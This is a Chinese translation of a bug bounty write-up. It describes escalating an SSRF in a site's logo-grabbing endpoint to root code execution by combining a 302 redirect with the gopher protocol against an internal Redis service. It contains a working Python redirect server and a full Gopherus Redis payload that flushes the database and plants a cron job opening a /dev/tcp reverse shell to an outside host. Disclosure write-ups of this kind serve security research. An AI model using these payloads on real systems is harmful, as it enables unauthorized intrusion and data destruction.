# 从SSRF到RCE——一个15,000美元的故事

## 译文声明
本文为翻译文章，原作者为sirleeroyjenkins，原文发表于sirleeroyjenkins.medium.com。译文仅供参考，具体内容及含义请以原文为准。

## 引言
在HackerOne的漏洞赏金计划中，我发现了某全球知名公司网站的一个服务器端请求伪造（SSRF）漏洞，并通过进一步研究将其扩展至远程代码执行（RCE）。

## 第一阶段：侦查
对于大规模的漏洞挖掘项目，通常会从子域名扫描开始。然而，在这个案例中，我的目标是一个单一的Web站点。因此，我使用GAU工具获取了一系列URL并分析了JavaScript脚本内容，然后利用Ffuf工具进行目录枚举，但没有发现明显异常。

接着，我使用Burp Suite作为代理来捕获所有与该网站相关的请求。在此过程中，我发现了一个敏感链接：
```
GET /xxx/logoGrabber?url=http://example.com
Host: site.example.com
...
```
其响应如下：
```json
{
  "responseTime": "99999ms",
  "grabbedUrl": "http://example.com",
  "urlInfo": {
    "pageTitle": "Example Title",
    "pageLogo": "pagelogourl"
  }
}
```
这表明该网站可能存在SSRF漏洞。

## 第二阶段：确认SSRF漏洞
虽然无法直接获取到内部IP地址，但我得到了一些子域名。经过测试，我发现该敏感链接可以返回非公开子域名的信息。例如，对于子域名`somecorpsite.example.com`，直接访问是无响应的，但将它放入敏感链接后：
```
GET /xxx/logoGrabber?url=http://somecorpsite.example.com
Host: site.example.com
...
```
返回了以下响应：
```json
{
  "responseTime": "9ms",
  "grabbedUrl": "http://somecorpsite.example.com",
  "urlInfo": {
    "pageTitle": "INTERNAL PAGE TITLE",
    "pageLogo": "http://somecorpsite.example.com/logos/logo.png"
  }
}
```
这是一个低危的SSRF漏洞。我编写了一份报告并提交给了相关团队，同时继续深入研究以提升其危害性。

## 第三阶段：从SSRF升级至RCE
### 尝试Gopher协议
首先尝试了Gopher协议，构造如下请求：
```
GET /xxx/logoGrabber?url=gopher://myburpcollaboratorurl
Host: site.example.com
...
```
遗憾的是，服务器返回错误信息，说明该网站不支持Gopher协议。

### 利用重定向
随后，我编写了一个Python脚本来实现302重定向：
```python
#!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv) - 1 != 2:
    print(f"""
    Usage: {sys.argv[0]} <port> <redirect_url>
    """)
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()

    def send_error(self, code, message=None):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
我将重定向的目标设置为Burp Collaborator模块的URL，命令如下：
```
python3 302redirect.py <port> "http://mycollaboratorurl/"
```
构造敏感链接指向我的重定向服务器：
```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
...
```
成功收到响应，证明此方法有效。

### 结合重定向和Gopher协议
接下来，我结合了重定向和Gopher协议的方法，将重定向的目标设为采用Gopher协议的Burp Collaborator URL：
```
python3 302redirect.py <port> "gopher://mycollaboratorurl/"
```
再次构造敏感链接：
```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
...
```
成功收到响应，证实了这种方法的有效性。此外，我还意外地发现可以通过这种方式访问到Web服务器的内部IP `127.0.0.1`。

## 第四阶段：后渗透
现在能够访问内部主机，我开始探测其开放端口，命令如下：
```
python3 302redirect.py <port> "gopher://127.0.0.1:<port>"
```
最终发现Redis服务运行在6379端口上：
```
302redirect → gopher://127.0.0.1:3306 [Response time: 3000ms] - CLOSED
302redirect → gopher://127.0.0.1:9000 [Response time: 2500ms] - CLOSED
302redirect → gopher://127.0.0.1:6379 [Response time: 500ms] - OPEN
```

利用Gopherus生成Redis反向Shell：
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
完整的命令如下：
```
python3 302redirect.py <port> "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"
```
发送请求：
```
GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: site.example.com
...
```
大约五分钟后，我收到了一个Shell。输入`whoami`命令后，发现当前用户是`root`。于是我立即断开连接，并撰写报告提交了这一漏洞。

该漏洞于2020年5月被发现并修复。我因此获得了15,000美元的奖励以及公司的高度赞赏。